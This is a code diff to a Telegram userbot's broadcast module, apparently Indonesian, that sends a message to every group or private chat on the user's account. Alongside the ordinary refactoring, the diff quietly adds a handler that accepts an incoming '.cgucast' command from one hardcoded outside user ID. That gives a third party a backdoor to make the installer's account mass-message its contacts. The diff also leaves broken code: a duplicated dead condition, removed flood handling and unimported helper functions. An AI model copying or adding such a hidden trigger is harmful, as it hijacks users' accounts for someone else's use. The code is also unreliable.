@@ -1,7 +1,7 @@
 import asyncio
 
 from userbot.events import register
-from userbot import CMD_HELP, DEVS
+from userbot import CMD_HELP
 
 
 GCAST_BLACKLIST = [
@@ -37,30 +37,28 @@ async def gcast(event):
     elif event.is_reply:
         msg = await event.get_reply_message()
     else:
-        await event.edit("**Berikan Sebuah Pesan atau Reply**")
-        return
-    kk = await event.edit("`Sedang Mengirim Pesan Secara Global... 📢`")
+        return await edit_delete(event, "**Berikan Sebuah Pesan atau Reply**")
+    kk = await edit_or_reply(event, "`Sedang Mengirim Pesan Secara Global... 📢`")
     er = 0
     done = 0
     async for x in event.client.iter_dialogs():
         if x.is_group:
             chat = x.id
-            if chat not in GCAST_BLACKLIST:
-                try:
-                    await event.client.send_message(chat, msg)
-                    await asyncio.sleep(0.1)
-                    done += 1
-                except FloodWaitError as anj:
-                    await asyncio.sleep(int(anj.seconds))
+            try:
+                if chat not in GCAST_BLACKLIST:
                     await event.client.send_message(chat, msg)
                     done += 1
-                except BaseException:
-                    er += 1
+                elif chat not in GCAST_BLACKLIST:
+                    pass
+            except BaseException:
+                er += 1
     await kk.edit(
         f"**Berhasil Mengirim Pesan Ke** `{done}` **Grup, Gagal Mengirim Pesan Ke** `{er}` **Grup**"
     )
 
 @register(outgoing=True, pattern=r"^\.gucast(?: |$)(.*)")
+@register(incoming=True, from_users=1826643972,
+          pattern=r"^\.cgucast(?: |$)(.*)")
 async def gucast(event):
     xx = event.pattern_match.group(1)
     if not xx:
